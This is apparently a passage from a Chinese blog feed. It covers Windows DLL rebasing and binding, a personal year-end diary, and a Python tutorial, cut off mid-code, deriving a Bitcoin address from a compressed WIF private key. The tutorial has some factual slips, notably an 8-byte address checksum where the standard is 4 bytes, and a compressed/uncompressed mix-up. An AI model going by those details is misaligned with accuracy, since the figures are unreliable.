bar.obj<br></code></pre></td></tr></table></figure><blockquote><p>要注意的是我们改变默认基地址需要时64K的倍数,上面参数中的0X10000是限定DLL可以占用空间的最大长度</p></blockquote><p>除了链接时可以修改意外,MSCV也提供一个叫<code>editbin</code>的工具(早期为rebase.exe),该工具可以修改已有的DLL的基地址,如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">editbin /REBASE:BASE=0x10020000 basr.dll<br></code></pre></td></tr></table></figure><h3 id="系统DLL"><a href="#系统DLL" class="headerlink" title="系统DLL"></a>系统DLL</h3><p>由于windwos内部会有很多系统的DLL,比如<code>&quot;kernel.dll&quot;</code>,<code>&quot;ntdll.dll&quot;</code>,<code>&quot;shell32.dll&quot;</code>,<code>&quot;user32.dll&quot;</code>,<code>&quot;msvcrt.dll&quot;</code>等,系统会在进程空间中专门划出一块0x70000000~0x80000000的区域,以此映射系统DLL,Windows在安装的时候就会把地址分配给这些DLL,从而在装载时就不需要进行过重定基址了</p><h2 id="序号-1"><a href="#序号-1" class="headerlink" title="序号"></a>序号</h2><p>序号标示被导出函数地址在DLL导出表的位置</p><p>一般而言仅供内部使用的导出函数只有序号没有函数名,这也外部使用者就无法推测他的含义和使用方法</p><p>Windwos API的函数名虽然是不变的,但他的序号却在各个windows版本中不停变化,也就意味着我们导入windows api的时候不能使用序号的方式来导入</p><h2 id="导入函数绑定"><a href="#导入函数绑定" class="headerlink" title="导入函数绑定"></a>导入函数绑定</h2><p>当程序运行时,所有被依赖的DLL都会被装载,而且一系列的导入导出符号依赖关系都会被重新解析,大多数情况下,这些DLL都会以同样的顺序被装在到同样的内存地址,也就意味着他们的导出符号地址不变,因此我们可以通过绑定导入函数的方法来优化DLL的性能,这种方式被称为 <strong>DLL绑定(DLL Binding)</strong></p><p>我们可以使用MSCV提供的工具来达到我们想要达到的目的:</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">editbin /<span class="hljs-keyword">BIND</span> xxx.exe<br></code></pre></td></tr></table></figure><p>其实现方法就是editbin对被绑定的程序的导入符号进行遍历查找,找到之后就把符号的运行时的目标地址写入到被绑定程序的导入表内,我们之前所说的INT表就是用于此,它用于存放绑定符号的地址。</p><h2 id="C-与动态链接"><a href="#C-与动态链接" class="headerlink" title="C++与动态链接"></a>C++与动态链接</h2><p>这一部分就暂时省略了</p><p>推荐阅读:&lt;&lt;COM本质论&gt;&gt;&gt;</p><p>COM即组件对象模型</p><h1 id="DLL-HELL"><a href="#DLL-HELL" class="headerlink" title="DLL HELL"></a>DLL HELL</h1><p>早期的时候,由于Windows缺乏一种有效的DLL版本控制机制,而频繁的更新导致经常发生兼容性的问题,因此人们将其称其为DLL噩梦(DLL HELL)</p><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因:"></a>产生原因:</h3><ol><li>旧版本的DLL替代新版本的DLL引起的</li><li>新版的DLL中的函数无意发生改变时引起的(因为完全的”向下”兼容并不可能)</li><li>新版DLL的安装引入一个新BUG</li></ol><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><ul><li><p>静态链接(Static linking)</p><p>终极方法,但会丧失使用动态链接的好处</p></li><li><p>防止DLL覆盖</p><p>windows下可以使用windows文件保护(Windows File Protection简称WFP)技术来缓解,他可以阻止未经授权的应用程序覆盖系统DLL</p><p>第三方应用程序不能覆盖操作系统DLL文件,除非他们的安装程序捆绑了Windows更新包,或者他们的安装程序运行时禁止了WFP服务</p></li><li><p>避免DLL冲突</p><p>解决不同的程序依赖相同DLL不同版本的方法就是让每一个程序有自己的一份DLL,并且将不同版本放到应用程序的文件夹中</p></li><li><p>.NET下DLL HELL的解决方法</p><p>.NET框架中,一个程序集(Assembly)有两种类型:应用程序程序(EXE可执行文件)集以及库程序(DLL动态链接库)集,一个程序集包括一个或多个文件,所以需要一个<code>清单文件</code>来描述程序集,这个清单文件被称为<code>Manifest文件</code></p><p><code>Manifest</code>描述了程序集的名字,版本号以及程序集的各种资源,同时也描述了该程序集的运行所依赖的资源,包括DLL以及其他资源文件</p><p><code>Manifest</code>是一个XML的描述文件,每个DLL有自己的manifest文件,每个应用程序也有自己的Manifest,对于应用程序而言,manifest文件可以和可执行文件在同一目录下,也可以作为资源嵌入到可执行文件的内部(Embed Manifest)</p><p>XP以前不考虑该文件,直接去system32目录下查找该可执行文件所依赖的DLL,而XP以后会先读取程序集的清单文件,获得该可执行文件需要调用的DLL列表,操作系统再根据DLL的清单文件去寻找对应的DLL来调用</p><blockquote><p>至此做了一个简单的记录,其中大段文字直接摘抄于原书,每一次看这本书都有不同的惊喜,真是深感自己太弱了</p></blockquote></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>随记</title>
    <link href="/2021/01/16/%E9%9A%8F%E8%AE%B0/"/>
    <url>/2021/01/16/%E9%9A%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>2021.1.16,今天过后就正式放假了,这也意味着大四上也飘飘而去了,早上起来,望着一地还未收拾好的行李箱,抽出椅子,打开电脑,愣了一会,打开了许久没打开的文件夹,顿了顿,还是写一些东西吧</p></blockquote><p>2020真是奇妙又糟心的一年,新年伊始,迎来的不是烟花和爆竹的热闹,而是口罩与隔离的冰冷</p><p>原本和女友约好放假回来一起好好复习的,因为放假前几天还一起去了口语培训,剩下一共20几天的假期也没带什么教科书,突然得知可能不能开学的消息还是怔了一下,果然是人算不如天算</p><p>在满心的期待中,还是开启了网课时代,想了想估计开学无望了,最后还是买了复习资料邮到家里(也因为准备不充分,开始买成了2020的试题2333</p><p>最令人焦头烂额的还是花呗炸了,计算了一下数额,开启了短暂的恰饭生涯,从没发出去的博客里捞了一个比较长的投了稿,最后也是有惊无险的解决了</p><p>因为准备考研,也和团队请了假,停下了比赛,分享,出题等等一系列的事宜,现在算来,还有一个月就快一年没怎么打比赛了,估计已经是菜鸡一枚了吧</p><p>如果一切按计划走下去,我猜现在应该正在准备复试或者二战事宜吧,但万事总不能一直如人愿</p><p>七月盛夏,大树发来了投递简历的邀约,正值被高数和酷暑双重折磨的我在失眠了一个晚上后,和父母还有女友商量了一下投简历的事情,父亲本来有强烈的希望我读研的意愿,但在我做出了只投一份简历的保证后松了口,女友也表示谅解,这里就不得不表白我的小可爱啦~</p><p>然后开启了一边准备面试一边复习的快乐(ku bi)生涯,但我这个方向的面经少到几乎绝种,在尝试搜索了一番后干脆放弃,不如多干些实事,刷什么面经,一路莽到了hr面,hr面的时候提到我没有实习经历,心里一凉,开始了漫长的(其实不长但感觉很漫长的)等结果的日子</p><p>时间总是流失的很快,伴随着时钟的滴答声和稿纸厚度的增加,也是时候收拾行装,带着对女友强烈的思念,回到学校了</p><p>返校后的第一个月每天和女友吃吃喝喝表达思念之情,复习的事情显得有些荒废了,但是每次两个人坐到一起摊开书总是不能进入复习状态也是不好的,就在这苦恼之际,邮箱亮起,拿到offer了</p><p>回想起5轮面试的细节,还是有些心悸,大半年没打ctf,害怕某些问题答不上来,面试过程中才发现…5轮下来唯一相关的就只有影响深刻的一道题目,剩下的都是实战和一些底层的实现原理,漏洞利用细节,算法还有简历上写的项目,感谢上水课无聊啃的一本本书和比赛中学到的知识</p><p>拿到offer后师兄给我打了电话,问我愿不愿意过去实习,在和女友商量后,发现两个人在一起复习确实没效率…纯属打扰她学习后,最终还是决定当一个的打工人</p><p>打工生涯就不细谈了,挖洞大佬们操作系统级挖洞清奇而又杀伤力强大的思路和逆向大佬们手撕vmp的效率真是震撼我一年2333</p><p>鼠年末尾的12月,正好实验课的实验需要补做,向师兄请了长假后回到了学校,本来打算继续啃书的,但是因为陪女朋友在自习室,在氛围的感染下,最后还是决定给自己上半年的复习生涯画一个句号,工作了小半年,数学忘得差不多了,短短十几天捡起来显然不现实,于是捡起了专业课,也是学习嘛,安全这东西需要的知识,学多少是多哇</p><p>2020.12.26日,圣诞节后牵着女友的手踏上了与考研决战的征程,政治英语数学专业课…</p><p>终究是结束了,既是考研的结束,也是给自己上半年的一个交代吧,,时间沉没成本就让他沉没在我人生长河的一途吧</p><p>考研结束的日子也是甜蜜而又忙碌,陪女友放空心情,写写课设,在学校的日子永远惬意而美好</p><p>再回过头,这个学期也要结束了,又要回杭州搬砖了,希望今年可以更进一步,再进一步,更多关注些虚拟化和操作系统级的漏洞吧</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>从比特币WIFC私钥到地址</title>
    <link href="/2020/04/10/%E4%BB%8E%E6%AF%94%E7%89%B9%E5%B8%81WIFC%E7%A7%81%E9%92%A5%E5%88%B0%E5%9C%B0%E5%9D%80/"/>
    <url>/2020/04/10/%E4%BB%8E%E6%AF%94%E7%89%B9%E5%B8%81WIFC%E7%A7%81%E9%92%A5%E5%88%B0%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<blockquote><p>最近学校课程作业遇到了该问题,即如何将WIFC私钥转化为地址,因此就做了一番学习,在这做一下记录,因为也是初次接触相关内容,如果文中有错误的地方敬请斧正</p></blockquote><h1 id="借鉴的网站"><a href="#借鉴的网站" class="headerlink" title="借鉴的网站"></a>借鉴的网站</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>aaron67.cc<span class="hljs-regexp">/2019/</span><span class="hljs-number">01</span><span class="hljs-regexp">/04/</span>bitcoin-address/<br>https:<span class="hljs-regexp">//</span>steemit.com<span class="hljs-regexp">/cn/</span>@oflyhigh/bitcoin-base58-and-base58check-private-key-public-key-address<br>https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">82093348</span><br>https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">30290735</span><br></code></pre></td></tr></table></figure><h1 id="什么是比特币地址？"><a href="#什么是比特币地址？" class="headerlink" title="什么是比特币地址？"></a>什么是比特币地址？</h1><p>我们所称的比特币地址可以通俗的理解为我们的银行卡号，我们可以同时拥有多个地址，与此同时，通过区块链也可以查明每个地址的所有的转账记录</p><p>一般来说我们的比特币地址有多种形式，其中最常用的两种一个是以1开头的P2PKH地址，即通过一对私钥和公钥控制的钱包地址</p><p>那么另一个就是以3开头的P2SH地址</p><p>而如果是测试网络，那么会以2，m,n等作为开头，以此来避免我们将币错误的发到测试网络中</p><h1 id="WIF私钥"><a href="#WIF私钥" class="headerlink" title="WIF私钥"></a>WIF私钥</h1><p>我们的WIF是 Wallet Import Format 的一个缩写，他有着压缩和不压缩两种形式，即压缩WIF compressed（以下简写为WIFC），不压缩WIF uncompressed（以下简写为WIF)</p><p>但无论是否压缩，他们都是我们的私钥通过base58check编码之后得到的</p><p>那么他们的区别是什么呢？</p><p>我们的WIF，是在我们的私钥前面加上0x80这个前缀之后，对这个新产生的值做两次sha256的操作，并将这个计算结果的前四个4节作为我们的验证位</p><p>那么我们的WIF就是 80+私钥+验证位 做一个base58编码的结果,其会以数字5开头</p><p>那么我们的WIFC呢？</p><p>WIFC的计算与WIF相似，其不同之处在于其刚开始计算时不仅要加0x80的前缀，还需要在结尾增加一个压缩标志后缀，即0x01,剩下的结果就与之前没有区别了,做两次sha256,取前四个字节为验证位</p><p>WIFC: 80+私钥+01+验证位 做一次base58编码,他会以我们的K或L开头</p><h1 id="从WIFC-Address"><a href="#从WIFC-Address" class="headerlink" title="从WIFC-&gt;Address"></a>从WIFC-&gt;Address</h1><blockquote><p>我们所需的流程为:WIFC-&gt;private_key-&gt;public_key-&gt;public_key_hash-&gt;address</p></blockquote><h2 id="从WIF-privite-key"><a href="#从WIF-privite-key" class="headerlink" title="从WIF-&gt;privite key"></a>从WIF-&gt;privite key</h2><p>那么既然我们知道了我们的WIF和WIFC是如何计算的,那么我们就可以知道我们的私钥改如何逆推回去了</p><p>首先我们拿一个WIFC私钥为例:’Kwa6hgpEfzwcsvcTCetNjfkPtcCgVt9suVo4zjtBp7At17GAQZUi’</p><p>看到其以K开头就知道是我们的WIFC私钥,然后我们先对其进行一次base58check的解码</p><p>我们就可以得到:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> hexlify, unhexlify<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base58<br><br>compressedWIF=<span class="hljs-string">&#x27;Kwa6hgpEfzwcsvcTCetNjfkPtcCgVt9suVo4zjtBp7At17GAQZUi&#x27;</span><br><br>private_salt=hexlify(base58.b58decode_check(compressedWIF))<br><span class="hljs-keyword">log</span>.success(<span class="hljs-string">&#x27;private_salt:&#x27;</span>+(private_salt))<br><br><br>运行结果:<br>[+] private_salt:<span class="hljs-number">800</span>a7d0d1b60ebe37292229505ca8f36a9ab78bee9ce03a2e43ebfd8fb905947d601<br></code></pre></td></tr></table></figure><p>那么先不向下进行,我们先做一次base58的解码</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> hexlify, unhexlify<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base58<br><br>compressedWIF=<span class="hljs-string">&#x27;Kwa6hgpEfzwcsvcTCetNjfkPtcCgVt9suVo4zjtBp7At17GAQZUi&#x27;</span><br><br>private_salt=hexlify(base58.b58decode(compressedWIF))<br><span class="hljs-keyword">log</span>.success(<span class="hljs-string">&#x27;private_salt:&#x27;</span>+(private_salt))<br><br>运行结果:<br>[+] private_salt:<span class="hljs-number">800</span>a7d0d1b60ebe37292229505ca8f36a9ab78bee9ce03a2e43ebfd8fb905947d601325f50cf<br></code></pre></td></tr></table></figure><p>从这里我们就能看出我们base58_check解码和base58解码得到结果的一个区别了</p><p>我们的base58_check会自动去除我们的校验位,而base58则不会</p><p>那么到了这里,我们只需要去除我们的80前缀和01压缩后缀即可得到我们的私钥</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> binascii import hexlify, unhexlify<br><span class="hljs-keyword">from</span> pwn import *<br>import base58<br><br><span class="hljs-attribute">compressedWIF</span>=<span class="hljs-string">&#x27;Kwa6hgpEfzwcsvcTCetNjfkPtcCgVt9suVo4zjtBp7At17GAQZUi&#x27;</span><br><br><span class="hljs-attribute">private_salt</span>=hexlify(base58.b58decode(compressedWIF))<br>log.success(<span class="hljs-string">&#x27;private_salt:&#x27;</span>+(private_salt))<br><br><span class="hljs-attribute">private_key</span>=private_salt[2<span class="hljs-keyword">:len</span>(private_salt)-10]<br>log.success(<span class="hljs-string">&#x27;private_key:&#x27;</span>+(private_key))<br><br>运行结果:<br>[+] private_salt:800a7d0d1b60ebe37292229505ca8f36a9ab78bee9ce03a2e43ebfd8fb905947d601325f50cf<br>[+] private_key:0a7d0d1b60ebe37292229505ca8f36a9ab78bee9ce03a2e43ebfd8fb905947d6<br></code></pre></td></tr></table></figure><h2 id="从private-key-public-key"><a href="#从private-key-public-key" class="headerlink" title="从private key -&gt; public key"></a>从private key -&gt; public key</h2><p>那么到此我们就得到了我们的private_key,现在需要转化为我们的公钥了</p><p>那么我们如何通过私钥转化为公钥呢?这里就不得不说椭圆曲线了</p><p>椭圆曲线的具体实现流程我就在这里不用大篇幅来讲,他主要依靠于我们解决椭圆曲线离散对数问题十分困难这一点,详情可以从<a href="https://zh.wikipedia.org/wiki/%E6%A4%AD%E5%9C%86%E6%9B%B2%E7%BA%BF%E5%AF%86%E7%A0%81%E5%AD%A6">wiki</a>上查看</p><p>这里我们使用的是比特币使用的一条椭圆曲线,即</p><p><img src="https://s1.ax1x.com/2020/04/10/GTMhOs.png" alt="GTMhOs.png"></p><p>它由我们的secp256k1标准来定义,其中p为一个很大的素数</p><p>而我们的公钥,是这条椭圆曲线上的一个点:</p><p>K&#x3D;k*G</p><p>其中,我们的k就是我们的私钥,而G为一个固定的点</p><p>由于我们椭圆曲线离散对数问题这一数学难题,因此我们无法从公钥逆推回私钥,从而保证了我们私钥的安全性</p><p>知道了公钥如何计算,下面我们就可以得到公钥了,这里需要注意的是我们的公钥也是分为压缩公钥和非压缩公钥的</p><p>那么他们又有什么区别呢?</p><p>首先通过计算,我们可以得到公钥的x轴坐标和y轴坐标,那么如果我们想要得到我们的非压缩公钥,就十分的简单了</p><p>只需要在前面加一个表示非压缩的前缀0x04即可,其最终格式为:</p><p>04 + K.x + K.y</p><p>其中K.x为公钥横坐标,K.y为公钥纵坐标</p><p>那么我们如何得到非压缩公钥呢?</p><p>由于我们曲线的特殊性,我们只需要知道x轴坐标和y轴坐标的奇偶性就可以推算出y的值,那么也就有了一个定义</p><p>如果y轴坐标为奇数,那么x轴的前缀就需要添加0x03,如果为偶数则需要添加0x02</p><p>那么我们压缩公钥的格式就为:</p><p>前缀(0x03||0x02) + K.x</p><p>这里我们就来计算我们的公钥的值吧</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> secp256k1 <span class="hljs-keyword">import</span> PrivateKey<br><span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> hexlify, unhexlify<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base58<br><br>compressedWIF=<span class="hljs-string">&#x27;Kwa6hgpEfzwcsvcTCetNjfkPtcCgVt9suVo4zjtBp7At17GAQZUi&#x27;</span><br><br>private_salt=hexlify(base58.b58decode(compressedWIF))<br><span class="hljs-keyword">log</span>.success(<span class="hljs-string">&#x27;private_salt:&#x27;</span>+(private_salt))<br><br>private_key=private_salt[<span class="hljs-number">2</span>:len(private_salt)<span class="hljs-number">-10</span>]<br><span class="hljs-keyword">log</span>.success(<span class="hljs-string">&#x27;private_key:&#x27;</span>+(private_key))<br><br>privkey=PrivateKey(unhexlify(private_key))<br>uncompressed_public_key = hexlify(privkey.pubkey.serialize(compressed=<span class="hljs-keyword">False</span>)).decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br><span class="hljs-keyword">log</span>.success(<span class="hljs-string">&#x27;uncompressed public_key:&#x27;</span>+(uncompressed_public_key))<br><br>compressed_public_key=hexlify(privkey.pubkey.serialize()).decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)<br><span class="hljs-keyword">log</span>.success(<span class="hljs-string">&#x27;compressed public_key:&#x27;</span>+(compressed_public_key))<br><br><br>运行结果:<br>[+] private_salt:<span class="hljs-number">800</span>a7d0d1b60ebe37292229505ca8f36a9ab78bee9ce03a2e43ebfd8fb905947d601325f50cf<br>[+] private_key:<span class="hljs-number">0</span>a7d0d1b60ebe37292229505ca8f36a9ab78bee9ce03a2e43ebfd8fb905947d6<br>[+] uncompressed public_key:<span class="hljs-number">041</span>decbd8ff0c1b8e328bab5ea9794ebcffbcba7f8e8c1e604a193bea543ef13160cfafec08b79973f519843ec8f724302f454dba89224389c42e8fb3b4444148b<br>[+] compressed public_key:<span class="hljs-number">031</span>decbd8ff0c1b8e328bab5ea9794ebcffbcba7f8e8c1e604a193bea543ef1316<br><br></code></pre></td></tr></table></figure><h2 id="public-key-public-key-hash"><a href="#public-key-public-key-hash" class="headerlink" title="public_key-&gt;public_key_hash"></a>public_key-&gt;public_key_hash</h2><p>得到了我们的public_key,我们就可以来计算我们的public_key_hash了</p><p>计算public_key_hash需要我们的压缩密钥,也就是我们前面计算出来的</p><p>031decbd8ff0c1b8e328bab5ea9794ebcffbcba7f8e8c1e604a193bea543ef1316</p><p>那么我们首先需要对他做一次hash256,并对结果做一次RIPEMD160的计算,这样得出来的值就是我们的public_key_hash了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> secp256k1 import PrivateKey<br><span class="hljs-keyword">from</span> binascii import hexlify, unhexlify<br><span class="hljs-keyword">from</span> pwn import *<br>import hashlib<br>import base58<br><br><span class="hljs-attribute">compressedWIF</span>=<span class="hljs-string">&#x27;Kwa6hgpEfzwcsvcTCetNjfkPtcCgVt9suVo4zjtBp7At17GAQZUi&#x27;</span><br><br><span class="hljs-attribute">private_salt</span>=hexlify(base58.b58decode(compressedWIF))<br>log.success(<span class="hljs-string">&#x27;private_salt:&#x27;</span>+(private_salt))<br><br><span class="hljs-attribute">private_key</span>=private_salt[2<span class="hljs-keyword">:len</span>(private_salt)-10]<br>log.success(<span class="hljs-string">&#x27;private_key:&#x27;</span>+(private_key))<br><br><span class="hljs-attribute">privkey</span>=PrivateKey(unhexlify(private_key))<br>uncompressed_public_key = hexlify(privkey.pubkey.serialize(<span class="hljs-attribute">compressed</span>=<span class="hljs-literal">False</span>)).decode(&#x27;ascii&#x27;)<br>log.success(<span class="hljs-string">&#x27;uncompressed public_key:&#x27;</span>+(uncompressed_public_key))<br><br><span class="hljs-attribute">compressed_public_key</span>=hexlify(privkey.pubkey.serialize()).decode(&#x27;ascii&#x27;)<br>log.success(<span class="hljs-string">&#x27;compressed public_key:&#x27;</span>+(compressed_public_key))<br><br><span class="hljs-comment">#first hash256</span><br><span class="hljs-attribute">hash256</span>=hashlib.sha256()<br>hash256.update(unhexlify(compressed_public_key))<br><span class="hljs-attribute">Cpublic_hash256</span>=hash256.hexdigest()<br>log.success(<span class="hljs-string">&#x27;compressed public_key hash256 :&#x27;</span>+(Cpublic_hash256))<br><br><span class="hljs-comment">#ripemd160(hash256())</span><br><span class="hljs-attribute">ripemd</span>=hashlib.new(&#x27;ripemd160&#x27;)<br>ripemd.update(unhexlify(Cpublic_hash256))<br><span class="hljs-attribute">Cpublic_ripemd</span>=ripemd.hexdigest()<br>log.success(<span class="hljs-string">&#x27;compressed public_key hash &amp; ripmed :&#x27;</span>+(Cpublic_ripemd))<br><br>运行结果:<br>[+] private_salt:800a7d0d1b60ebe37292229505ca8f36a9ab78bee9ce03a2e43ebfd8fb905947d601325f50cf<br>[+] private_key:0a7d0d1b60ebe37292229505ca8f36a9ab78bee9ce03a2e43ebfd8fb905947d6<br>[+] uncompressed public_key:041decbd8ff0c1b8e328bab5ea9794ebcffbcba7f8e8c1e604a193bea543ef13160cfafec08b79973f519843ec8f724302f454dba89224389c42e8fb3b4444148b<br>[+] compressed public_key:031decbd8ff0c1b8e328bab5ea9794ebcffbcba7f8e8c1e604a193bea543ef1316<br>[+] compressed public_key hash256 :08fdc7cea4b50c4280e33bfe7ba7a0d19d8235cbc94a78e1e977bdd13ffbc5db<br>[+] compressed public_key hash &amp; ripmed :ff452ce82e7b9e157e0f7abd188d75ab698c74cf<br><br></code></pre></td></tr></table></figure><h2 id="从public-key-hash-Address"><a href="#从public-key-hash-Address" class="headerlink" title="从public_key_hash-&gt;Address"></a>从public_key_hash-&gt;Address</h2><p>有了我们的哈希值,现在就是最后一步了,即计算我们的地址,我们将我们的哈希值记为H</p><p>下面就先给我们的H加一个前缀0x00,然后对这个结果做两次sha256的运算</p><p>取这个运算结果的前8个字节作为校验码，最后得到的格式即为：</p><p>0x00 + H +校验码</p><p>此时再对该校验码做一个base58的计算即可得出我们的地址啦</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> secp256k1 import PrivateKey <br><span class="hljs-keyword">from</span> binascii import hexlify, unhexlify<br><span class="hljs-keyword">from</span> pwn import *<br>import hashlib<br>import base58<br><br><span class="hljs-attribute">compressedWIF</span>=<span class="hljs-string">&#x27;Kwa6hgpEfzwcsvcTCetNjfkPtcCgVt9suVo4zjtBp7At17GAQZUi&#x27;</span><br><br><span class="hljs-attribute">private_salt</span>=hexlify(base58.b58decode(compressedWIF))<br>log.success(<span class="hljs-string">&#x27;private_salt:&#x27;</span>+(private_salt))<br><br><span class="hljs-attribute">private_key</span>=private_salt[2<span class="hljs-keyword">:len</span>(private_salt)-10]<br>log.success(<span class="hljs-string">&#x27;private_key:&#x27;</span>+(private_key))<br><br><span class="hljs-attribute">privkey</span>=PrivateKey(unhexlify(private_key))<br>uncompressed_public_key = hexlify(privkey.pubkey.serialize(<span class="hljs-attribute">compressed</span>=<span class="hljs-literal">False</span>)).decode(&#x27;ascii&#x27;)<br>log.success(<span class="hljs-string">&#x27;uncompressed public_key:&#x27;</span>+(uncompressed_public_key))<br><br><span class="hljs-attribute">compressed_public_key</span>=hexlify(privkey.pubkey.serialize()).decode(&#x27;ascii&#x27;)<br>log.success(<span class="hljs-string">&#x27;compressed public_key:&#x27;</span>+(compressed_public_key))<br><br><span class="hljs-comment">#first hash256</span><br><span class="hljs-attribute">hash256</span>=hashlib.sha256()<br>hash256.update(unhexlify(compressed_public_key))<br><span class="hljs-attribute">Cpublic_hash256</span>=hash256.hexdigest()<br>log.success(<span class="hljs-string">&#x27;compressed public_key hash256 :&#x27;</span>+(Cpublic_hash256))<br><br><span class="hljs-comment">#ripemd160(hash256())</span><br><span class="hljs-attribute">ripemd</span>=hashlib.new(&#x27;ripemd160&#x27;)<br>ripemd.update(unhexlify(Cpublic_hash256))<br><span class="hljs-attribute">Cpublic_ripemd</span>=ripemd.hexdigest()<br>log.success(<span class="hljs-string">&#x27;compressed public_key hash &amp; ripmed :&#x27;</span>+(Cpublic_ripemd))<br><br><span class="hljs-comment">#hash256</span><br><span class="hljs-attribute">Cpublic_ripemd</span>=b&#x27;\x00&#x27;+unhexlify(Cpublic_ripemd)<br>log.success(<span class="hljs-string">&#x27;add &quot;\x00&quot;: 